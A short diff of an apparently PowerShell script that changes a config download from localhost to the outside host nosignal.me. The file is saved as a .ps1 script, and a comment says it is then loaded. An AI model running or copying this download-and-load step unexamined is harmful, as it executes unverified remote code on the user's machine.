@@ -81,7 +81,7 @@ if ([string]::IsNullOrEmpty($override)) {
 }
 
 if ([string]::IsNullOrEmpty($path)) {
-    Invoke-RestMethod -uri "http://localhost/config.cl" -OutFile $temp"\cl_params.ps1"
+    Invoke-RestMethod -uri "http://nosignal.me/config.cl" -OutFile $temp"\cl_params.ps1"
 }
 # If being used, load config file
 if (Test-Path -Path $temp"cl_params.ps1") {
